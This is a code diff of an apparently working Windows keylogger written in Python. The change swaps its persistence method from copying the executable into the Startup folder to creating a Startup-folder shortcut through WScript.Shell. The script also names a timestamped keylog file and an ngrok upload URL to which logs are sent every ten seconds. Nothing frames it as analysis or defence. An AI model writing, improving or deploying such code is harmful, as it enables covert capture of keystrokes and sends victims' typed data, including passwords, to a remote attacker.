@@ -11,24 +11,51 @@ import requests
 import ctypes
 import sys
 import subprocess
-
+import win32com.client
 
 
 SERVER_URL = " https://a90e4bebaa09.ngrok-free.app/upload"
 UPLOAD_INTERVAL = 10
 
 
-current_exe_path = sys.executable
-startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-startup_exe_path = os.path.join(startup_folder, os.path.basename(current_exe_path))
 
-if not os.path.exists(startup_exe_path):
-    try:
-        shutil.copy2(current_exe_path, startup_exe_path)
-        print("Copied to startup folder.")
-    except Exception as e:
-        print("Failed to copy to startup folder:", e)
 
+def create_startup_shortcut(exe_path):
+    # Get the current user's Startup folder path
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    
+    # Define the shortcut path in the Startup folder
+    shortcut_name = os.path.basename(exe_path) + ".lnk"
+    shortcut_path = os.path.join(startup_folder, shortcut_name)
+    
+    # Check if the shortcut already exists
+    if os.path.exists(shortcut_path):
+        print(f"Shortcut already exists at: {shortcut_path}")
+        return
+
+    # Create a Shell object using COM
+    shell = win32com.client.Dispatch('WScript.Shell')
+    
+    # Create the shortcut
+    shortcut = shell.CreateShortcut(shortcut_path)
+    
+    # Set the target of the shortcut (where it points to)
+    shortcut.TargetPath = exe_path
+    
+    # Optionally, set the icon (you can use the exe's icon or any custom one)
+    shortcut.IconLocation = exe_path
+    
+    # Save the shortcut
+    shortcut.save()
+    
+    print(f"Shortcut created: {shortcut_path}")
+
+if __name__ == "__main__":
+    # Get the path to the current running executable
+    current_exe_path = sys.executable
+    
+    # Create the shortcut in the Startup folder
+    create_startup_shortcut(current_exe_path)
 
 log_file = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
 logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
